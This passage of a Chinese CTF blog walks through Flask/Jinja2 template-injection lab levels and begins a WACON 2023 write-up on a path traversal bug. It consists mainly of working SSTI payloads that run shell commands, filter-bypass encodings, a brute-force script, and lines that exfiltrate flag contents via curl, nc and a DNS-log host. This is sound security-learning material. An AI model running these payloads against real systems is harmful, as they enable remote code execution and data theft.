class="line">获取__builtins__属性：&#123;&#123;lipsum.__globals__|attr(&#x27;get&#x27;)(&#x27;__builtins__&#x27;)&#125;&#125;		利用get()、pop()获取属性，相当于lipsum.__globals__.get(&#x27;__builtins__&#x27;)</span><br><span class="line"></span><br><span class="line">lipsum.__globals__.__builtins__  相当于  lipsum|attr(&#x27;__globals__&#x27;)|attr(&#x27;get&#x27;)(&#x27;__builtins__&#x27;)</span><br><span class="line">lipsum.__globals__.__builtins__.chr(95)  相当于  lipsum|attr(&#x27;__globals__&#x27;)|attr(&#x27;get&#x27;)(&#x27;__builtins__&#x27;)|attr(&#x27;get&#x27;)(&#x27;chr&#x27;)(95)</span><br><span class="line"></span><br><span class="line">得到chr函数：&#123;%set chr=lipsum.__globals__.__builtins__.chr%&#125;</span><br><span class="line">利用chr()得到字符：&#123;&#123;chr(47)~chr(32)&#125;&#125;  47是/  32是空格  ~是连接符</span><br><span class="line"></span><br><span class="line">利用os执行命令：lipsum.__globals__.os.popen(&#x27;dir&#x27;).read()  相当于  lipsum|attr(&#x27;__globals__&#x27;)|attr(&#x27;get&#x27;)(&#x27;os&#x27;)|attr(&#x27;popen&#x27;)(&#x27;dir&#x27;)|attr(&#x27;read&#x27;)()</span><br><span class="line">类似的		  url_for[&#x27;__globals__&#x27;][&#x27;os&#x27;][&#x27;popen&#x27;](&#x27;dir&#x27;).read()</span><br><span class="line"></span><br><span class="line">简单的读取文件：url_for[&quot;__globa&quot;+&quot;ls__&quot;].__builtins__.open(&quot;flag.txt&quot;).read()</span><br><span class="line"></span><br><span class="line">在能执行eval情况下：eval(__import__(&#x27;so&#x27;[::-1]).__getattribute__(&#x27;syste&#x27;%2b&#x27;m&#x27;)(&#x27;curl http://xxx:4567?p=`cat /f*`&#x27;))</span><br></pre></td></tr></table></figure>
<h2 id="第一题">第一题</h2>
<p>没啥好说的，就是根据一堆网上的资料写的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__base__.__subclasses__()[<span class="number">133</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;cat flag&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__base__.__subclasses__()[<span class="number">80</span>].__init__.__globals__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&quot;cat flag&quot;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>但是我这边没有os模块，也就不列举了</p>
<p><code>['popen'](&quot;command&quot;).read()</code>主要利用的地方，也可以用system代替popen（本题不行），但是尽量不用system</p>
<p>在本地找到的是 <code>os._wrap_close</code> 这个类。</p>
<p>当然利用的还可以是eval()</p>
<p><code>__import__()</code>等</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:5000/level/1&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    data = &#123;<span class="string">&quot;code&quot;</span>: <span class="string">&#x27;&#123;&#123;&quot;&quot;.__class__.__base__.__subclasses__()[&#x27;</span>+ <span class="built_in">str</span>(i) +<span class="string">&#x27;].__init__.__globals__&#x27;</span>+<span class="string">&quot;[&#x27;popen&#x27;]&quot;</span>+<span class="string">&#x27;&#125;&#125;&#x27;</span>&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;0x&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                <span class="built_in">print</span>(i,<span class="string">&quot;《&quot;</span>,response.text,<span class="string">&quot;》&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> :</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
<h2 id="第二题">第二题</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">过滤了&#123;&#123;&#125;&#125;</span><br><span class="line"></span><br><span class="line">那么直接可以用&#123;%%&#125;代替</span><br><span class="line"></span><br><span class="line">那么要在&#123;%command%&#125;处执行if，或者for语句</span><br><span class="line"></span><br><span class="line">&#123;%%&#125;&#123;%endif或者endfor%&#125;(这里主要是为了寻找到可利用的模块)</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;%<span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()%&#125;</span><br><span class="line">	&#123;%<span class="keyword">if</span> i.__name__ ==<span class="string">&#x27;_wrap_close&#x27;</span>%&#125;</span><br><span class="line">		&#123;%<span class="built_in">print</span> i.__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;cat flag&#x27;</span>).read()%&#125;</span><br><span class="line">	&#123;%endif%&#125;</span><br><span class="line">&#123;%endfor%&#125;</span><br></pre></td></tr></table></figure>
<p>或者</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;%<span class="built_in">print</span>(x.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat flag&#x27;).read()&quot;</span>))%&#125;</span><br></pre></td></tr></table></figure>
<h2 id="第三题">第三题</h2>
<p>盲注</p>
<p>根据网上提供的wp有两种，一种是dnslog外带，一种是自己nc监听</p>
<p>那么这边比较不会的是nc监听那么就使用他了</p>
<p>首先在终端使用命令nc -lvnp 2020监听所有使用2020端口的地址</p>
<p>然后再使用命令注入</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="number">1</span>].__subclasses__() %&#125;</span><br><span class="line">	&#123;% <span class="keyword">if</span> i.__name__==<span class="string">&#x27;_wrap_close&#x27;</span> %&#125;</span><br><span class="line">		&#123;%<span class="built_in">print</span> i.__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;cat flag|nc 0.0.0.0 2020&#x27;</span>).read()%&#125;</span><br><span class="line">	&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
<p>其中mro[-1]可以将类名形成一个元组直接进行for循环</p>
<p>当然也可以直接将上面的wp改改就行了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;%<span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()%&#125;</span><br><span class="line">	&#123;%<span class="keyword">if</span> i.__name__ ==<span class="string">&#x27;_wrap_close&#x27;</span>%&#125;</span><br><span class="line">		&#123;%<span class="built_in">print</span> i.__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;cat flag|nc 0.0.0.0 2020&#x27;</span>).read()%&#125;</span><br><span class="line">	&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
<p>那么用一下dnslog来解题</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;%<span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()%&#125;</span><br><span class="line">	&#123;%<span class="keyword">if</span> i.__name__ ==<span class="string">&#x27;_wrap_close&#x27;</span>%&#125;</span><br><span class="line">		&#123;%<span class="built_in">print</span> i.__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;curl http://`cat flag`.t6n089.ceye.io&#x27;</span>).read()%&#125;</span><br><span class="line">	&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
<p>主要是有点慢，而且不显示{}</p>
<h2 id="第四题">第四题</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;%<span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()%&#125;</span><br><span class="line">	&#123;%<span class="keyword">if</span> i.__name__ ==<span class="string">&#x27;_wrap_close&#x27;</span>%&#125;</span><br><span class="line">		&#123;%<span class="built_in">print</span> i.__init__.__globals__.__getitem__(<span class="string">&#x27;popen&#x27;</span>)(<span class="string">&#x27;cat flag&#x27;</span>).read()%&#125;</span><br><span class="line">	&#123;%endif%&#125;</span><br><span class="line">&#123;%endfor%&#125;</span><br></pre></td></tr></table></figure>
<p>对于索引的<code>[]</code>可以用<code>pop()</code>或<code>__getitem__()</code>代替<code>[]</code>；而类的可以用<code>__getattribute__</code>绕过</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;%<span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()%&#125;&#123;%<span class="keyword">if</span> i.__name__ ==<span class="string">&#x27;_wrap_close&#x27;</span>%&#125;&#123;%<span class="built_in">print</span> i.__init__.__globals__.__getitem__(<span class="string">&#x27;popen&#x27;</span>)(<span class="string">&#x27;cat flag|nc 0.0.0.0 2020&#x27;</span>).read()%&#125;&#123;%endif%&#125;&#123;%endfor%&#125;</span><br></pre></td></tr></table></figure>
<p>最好使用下面的格式(顺便监听一下)，不然会出现文本变得很长的问题</p>
<h2 id="第五题">第五题</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[<span class="number">133</span>]&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>先判断一下位置</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">POST /level/5 HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: 127.0.0.1:5000</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0</span><br><span class="line"></span><br><span class="line">Accept: */*</span><br><span class="line"></span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line"></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line"></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line"></span><br><span class="line">Content-Length: 128</span><br><span class="line"></span><br><span class="line">Origin: http://127.0.0.1:5000</span><br><span class="line"></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">Referer: http://127.0.0.1:5000/level/5</span><br><span class="line"></span><br><span class="line">Sec-Fetch-Dest: empty</span><br><span class="line"></span><br><span class="line">Sec-Fetch-Mode: cors</span><br><span class="line"></span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line"></span><br><span class="line">Cookie:arg1=popen;arg2=cat flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">code=&#123;&#123;().__class__.__base__.__subclasses__()[133].__init__.__globals__[request.cookies.arg1](request.cookies.arg2).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>将用到‘’和“”的地方换一下发包</p>
<p>我试过post绕过，但是一直不成功显示no level，不过也是尽量不用post，会改变很多东西，删去post也会导致feibao</p>
<p>至于chr方法还不是很清楚，后面补</p>
<h2 id="第六题">第六题</h2>
<p>编码绕过</p>
<p>1.16进制编码（中间不用.分隔）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>[<span class="string">&quot;\x5f\x5fclass\x5f\x5f&quot;</span>][<span class="string">&quot;\x5f\x5fbase\x5f\x5f&quot;</span>][<span class="string">&quot;\x5f\x5fsubclasses\x5f\x5f&quot;</span>]()[<span class="number">133</span>][<span class="string">&quot;\x5f\x5finit\x5f\x5f&quot;</span>][<span class="string">&quot;\x5f\x5fglobals\x5f\x5f&quot;</span>][<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;cat flag&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>2.unicode编码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;lipsum|attr(<span class="string">&quot;\u005f\u005fglobals\u005f\u005f&quot;</span>)|attr(<span class="string">&quot;\u005f\u005fgetitem\u005f\u005f&quot;</span>)(<span class="string">&quot;os&quot;</span>)|attr(<span class="string">&quot;popen&quot;</span>)(<span class="string">&quot;cat flag&quot;</span>)|attr(<span class="string">&quot;read&quot;</span>)()&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>3.base64（任意编码绕过需要py2，我是用的py3）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>|attr(<span class="string">&#x27;X19jbGFzc19f&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>))|attr(<span class="string">&#x27;X19iYXNlX18=&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>))|attr(<span class="string">&#x27;X19zdWJjbGFzc2VzX18=&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>))()[<span class="number">133</span>]|attr(<span class="string">&#x27;X19pbml0X18=&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>))|attr(<span class="string">&#x27;X19nbG9iYWxzX18=&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>))|attr(<span class="string">&#x27;popen&#x27;</span>)(<span class="string">&#x27;cat flag&#x27;</span>)|attr(<span class="string">&#x27;read&#x27;</span>)()&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>需要在py2的情况下，py3编码的问题默认type，所以可以先编码字符串再解码就行了，但是会出现无法绕过的情况，因此该方法仅使用与py2</p>
<h2 id="第七题">第七题</h2>
<p>[‘’]绕过</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>[<span class="string">&#x27;__class__&#x27;</span>][<span class="string">&#x27;__base__&#x27;</span>][<span class="string">&#x27;__subclasses__&#x27;</span>]()[<span class="number">133</span>][<span class="string">&#x27;__init__&#x27;</span>][<span class="string">&#x27;__globals__&#x27;</span>][<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;cat flag&#x27;</span>)[<span class="string">&#x27;read&#x27;</span>]()&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>attr()绕过</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;()|attr(<span class="string">&#x27;__class__&#x27;</span>)|attr(<span class="string">&#x27;__base__&#x27;</span>)|attr(<span class="string">&#x27;__subclasses__&#x27;</span>)()|attr(<span class="string">&#x27;__getitem__&#x27;</span>)(<span class="number">258</span>)|attr(<span class="string">&#x27;__init__&#x27;</span>)|attr(<span class="string">&#x27;__globals__&#x27;</span>)|attr(<span class="string">&#x27;__getitem__&#x27;</span>)(<span class="string">&#x27;os&#x27;</span>)|attr(<span class="string">&#x27;popen&#x27;</span>)(<span class="string">&#x27;cat flag&#x27;</span>)|attr(<span class="string">&#x27;read&#x27;</span>)()&#125;&#125;</span><br></pre></td></tr></table></figure>
<h2 id="第八题">第八题</h2>
<p>拼接法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>[<span class="string">&#x27;__cl&#x27;</span>+<span class="string">&#x27;ass__&#x27;</span>][<span class="string">&#x27;__ba&#x27;</span>+<span class="string">&#x27;se__&#x27;</span>][<span class="string">&#x27;__subc&#x27;</span>+<span class="string">&#x27;lasses__&#x27;</span>]()[<span class="string">&#x27;__getitem__&#x27;</span>](<span class="number">133</span>)[<span class="string">&#x27;__in&#x27;</span>+<span class="string">&#x27;it__&#x27;</span>][<span class="string">&#x27;__gl&#x27;</span>+ <span class="string">&#x27;obals__&#x27;</span>][<span class="string">&#x27;__getitem__&#x27;</span>](<span class="string">&#x27;po&#x27;</span>+<span class="string">&#x27;pen&#x27;</span>)(<span class="string">&#x27;cat flag&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
<h2 id="第九题">第九题</h2>
<p>过滤数字</p>
<p>1.可以使用第二题的wp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;%<span class="built_in">print</span>(x.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat flag&#x27;).read()&quot;</span>))%&#125;</span><br><span class="line">&#123;%<span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()%&#125;</span><br><span class="line">	&#123;%<span class="keyword">if</span> i.__name__ ==<span class="string">&#x27;_wrap_close&#x27;</span>%&#125;</span><br><span class="line">		&#123;%<span class="built_in">print</span> i.__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;cat flag&#x27;</span>).read()%&#125;</span><br><span class="line">	&#123;%endif%&#125;</span><br><span class="line">&#123;%endfor%&#125;</span><br></pre></td></tr></table></figure>
<p>2.使用lipsum</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;lipsum|attr(&quot;__globals__&quot;)|attr(&quot;__getitem__&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;cat flag&quot;)|attr(&quot;read&quot;)()&#125;&#125;</span><br></pre></td></tr></table></figure>
<h2 id="第十题">第十题</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url_for              flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[&#x27;__builtins__&#x27;]含有current_app。</span><br><span class="line">get_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[&#x27;__builtins__&#x27;]含有current_app。</span><br><span class="line">&#123;&#123;url_for.__globals__[&#x27;current_app&#x27;].config&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;get_flashed_messages.__globals__[&#x27;current_app&#x27;].config&#125;&#125;</span><br></pre></td></tr></table></figure>
<h2 id="第十一题">第十一题</h2>
<p>接下来就是学会如何构造字符，数字等等</p>
<p>通用格式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% set 变量=dirt(实际值=a)|join%&#125;</span><br><span class="line">&#123;% set 变量=(已有变量,dirt(实际值=a)|join,已有变量)&#125;</span><br><span class="line">&#123;% lipsum|string|list %&#125; 查看部分可利用字符，结合pop可以取出字符，attr可以返回其属性</span><br><span class="line">&#123;% set num=dirt(aaaa(个数=num)=a)|join|count%&#125; count可以换成length</span><br></pre></td></tr></table></figure>
<p>其中pop（）为删除函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> pop=<span class="built_in">dict</span>(pop=a)|join%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> xiahuaxian=(lipsum|string|<span class="built_in">list</span>)|attr(pop)(<span class="number">18</span>)%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> <span class="built_in">globals</span>=(xiahuaxian,xiahuaxian,<span class="built_in">dict</span>(<span class="built_in">globals</span>=a)|join,xiahuaxian,xiahuaxian)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> getitem=(xiahuaxian,xiahuaxian,<span class="built_in">dict</span>(getitem=a)|join,xiahuaxian,xiahuaxian)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> space=(lipsum|string|<span class="built_in">list</span>)|attr(pop)(<span class="number">9</span>)%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> os=<span class="built_in">dict</span>(os=a)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> popen=<span class="built_in">dict</span>(popen=a)|join%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> cat=<span class="built_in">dict</span>(cat=a)|join%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> cmd=(cat,space,<span class="built_in">dict</span>(flag=a)|join)|join%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> read=<span class="built_in">dict</span>(read=a)|join%&#125;</span><br><span class="line">&#123;&#123;(lipsum|attr(<span class="built_in">globals</span>))|attr(getitem)(os)|attr(popen)(cmd)|attr(read)()&#125;&#125;</span><br></pre></td></tr></table></figure>
<h2 id="第十二题">第十二题</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> nine=<span class="built_in">dict</span>(aaaaaaaaa=a)|join|count%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> eighteen=nine+nine%&#125;</span><br><span class="line"></span><br><span class="line">&#123;% <span class="built_in">set</span> pop=<span class="built_in">dict</span>(pop=a)|join%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> xiahuaxian=(lipsum|string|<span class="built_in">list</span>)|attr(pop)(eighteen)%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> <span class="built_in">globals</span>=(xiahuaxian,xiahuaxian,<span class="built_in">dict</span>(<span class="built_in">globals</span>=a)|join,xiahuaxian,xiahuaxian)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> getitem=(xiahuaxian,xiahuaxian,<span class="built_in">dict</span>(getitem=a)|join,xiahuaxian,xiahuaxian)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> space=(lipsum|string|<span class="built_in">list</span>)|attr(pop)(nine)%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> os=<span class="built_in">dict</span>(os=a)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> popen=<span class="built_in">dict</span>(popen=a)|join%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> cat=<span class="built_in">dict</span>(cat=a)|join%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> cmd=(cat,space,<span class="built_in">dict</span>(flag=a)|join)|join%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> read=<span class="built_in">dict</span>(read=a)|join%&#125;</span><br><span class="line">&#123;&#123;(lipsum|attr(<span class="built_in">globals</span>))|attr(getitem)(os)|attr(popen)(cmd)|attr(read)()&#125;&#125;</span><br></pre></td></tr></table></figure>
<h2 id="第十三题">第十三题</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> nine=<span class="built_in">dict</span>(aaaaaaaaa=a)|join|count%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> eighteen=<span class="built_in">dict</span>(aaaaaaaaaaaaaaaaaa=a)|join|count%&#125;</span><br><span class="line"></span><br><span class="line">&#123;% <span class="built_in">set</span> pop=<span class="built_in">dict</span>(pop=a)|join%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> xiahuaxian=(lipsum|string|<span class="built_in">list</span>)|attr(pop)(eighteen)%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> <span class="built_in">globals</span>=(xiahuaxian,xiahuaxian,<span class="built_in">dict</span>(<span class="built_in">globals</span>=a)|join,xiahuaxian,xiahuaxian)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> getitem=(xiahuaxian,xiahuaxian,<span class="built_in">dict</span>(getitem=a)|join,xiahuaxian,xiahuaxian)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> space=(lipsum|string|<span class="built_in">list</span>)|attr(pop)(nine)%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> os=<span class="built_in">dict</span>(os=a)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> popen=<span class="built_in">dict</span>(popen=a)|join%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> cat=<span class="built_in">dict</span>(cat=a)|join%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> cmd=(cat,space,<span class="built_in">dict</span>(flag=a)|join)|join%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> read=<span class="built_in">dict</span>(read=a)|join%&#125;</span><br><span class="line">&#123;&#123;(lipsum|attr(<span class="built_in">globals</span>))|attr(getitem)(os)|attr(popen)(cmd)|attr(read)()&#125;&#125;</span><br></pre></td></tr></table></figure>
<h2 id="总结">总结</h2>
<p>整体环境为：py3，linux，flask=2.2.2</p>
<h2 id="特别吐槽">特别吐槽</h2>
<p>千算万算没想到最后一直没回显是因为win10系统解析不了纯文本，在linux下就可以</p>
<p>至于如何发现的，那我就是再建立一个flag.txt，发现可以正常调用，那么命令是正常的，但是没办法正常回显</p>
<p>然后我移动到kali里面，然后做出了第一题</p>
<p>当然我还是没搞懂再flask1.1.1的情况下会造成前端bootstrap申请css出现500的情况（大概是flask的问题，最新版不出问题，略感难受，文档害死人了），甚至我怀疑是py自带的生产环境有问题，或者网络问题，前者我用第三方的WSGI进行排除，后者我一边用py2运行1.1.1，py3运行2.2.2，然后前后相差不到5s，基本确定是版本问题，原因不清楚</p>
<p>只能说，So，win10————</p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>ssti</tag>
      </tags>
  </entry>
  <entry>
    <title>2023waconCTF</title>
    <url>/2023/09/12/22-40-36/</url>
    <content><![CDATA[<h1 id="2023waconCTF"><a href="#2023waconCTF" class="headerlink" title="2023waconCTF"></a>2023waconCTF</h1><span id="more"></span>
<h2 id="mosaic"><a href="#mosaic" class="headerlink" title="mosaic"></a>mosaic</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/check_upload/@&lt;username&gt;/&lt;file&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_upload</span>(<span class="params">username, file</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> session.get(<span class="string">&#x27;logged_in&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> username == <span class="string">&quot;admin&quot;</span> <span class="keyword">and</span> session[<span class="string">&quot;username&quot;</span>] != <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Access Denied..&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> send_from_directory(<span class="string">f&#x27;<span class="subst">&#123;UPLOAD_FOLDER&#125;</span>/<span class="subst">&#123;username&#125;</span>&#x27;</span>, file)</span><br></pre></td></tr></table></figure>
<p>直接将username填充，没有进行过滤，可以直接获取password</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost:8090/check_upload/@../password.txt</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> session.get(<span class="string">&#x27;username&#x27;</span>) == <span class="string">&quot;admin&quot;</span> <span class="keyword">and</span> request.remote_addr == <span class="string">&quot;127.0.0.1&quot;</span>:</span><br><span class="line">       copyfile(FLAG, <span class="string">f&#x27;<span class="subst">&#123;UPLOAD_FOLDER&#125;</span>/<span class="subst">&#123;session[<span class="string">&quot;username&quot;</span>]&#125;</span>/flag.png&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>在上面获取到了admin之后，需要进行一次SSRF</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/mosaic&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mosaic</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> session.get(<span class="string">&#x27;logged_in&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        image_url = request.form.get(<span class="string">&#x27;image_url&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> image_url <span class="keyword">and</span> <span class="string">&quot;../&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> image_url <span class="keyword">and</span> <span class="keyword">not</span> image_url.startswith(<span class="string">&quot;/&quot;</span>):</span><br><span class="line">            guesstype = mimetypes.guess_type(image_url)[<span class="number">0</span>]</span><br><span class="line">            ext = guesstype.split(<span class="string">&quot;/&quot;</span>)[<span class="number">1</span>]</span><br><span class="line">            mosaic_path = os.path.join(<span class="string">f&#x27;<span class="subst">&#123;MOSAIC_FOLDER&#125;</span>/<span class="subst">&#123;session[<span class="string">&quot;username&quot;</span>]&#125;</span>&#x27;</span>, <span class="string">f&#x27;<span class="subst">&#123;os.urandom(<span class="number">8</span>).<span class="built_in">hex</span>()&#125;</span>.<span class="subst">&#123;ext&#125;</span>&#x27;</span>)</span><br><span class="line">            filename = os.path.join(<span class="string">f&#x27;<span class="subst">&#123;UPLOAD_FOLDER&#125;</span>/<span class="subst">&#123;session[<span class="string">&quot;username&quot;</span>]&#125;</span>&#x27;</span>, image_url)</span><br><span class="line">            <span class="keyword">if</span> os.path.isfile(filename):</span><br><span class="line">                image = imageio.imread(filename)</span><br><span class="line">            <span class="keyword">elif</span> image_url.startswith(<span class="string">&quot;http://&quot;</span>) <span class="keyword">or</span> image_url.startswith(<span class="string">&quot;https://&quot;</span>):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Not yet..! sry..&quot;</span></span><br><span class="line">            <span 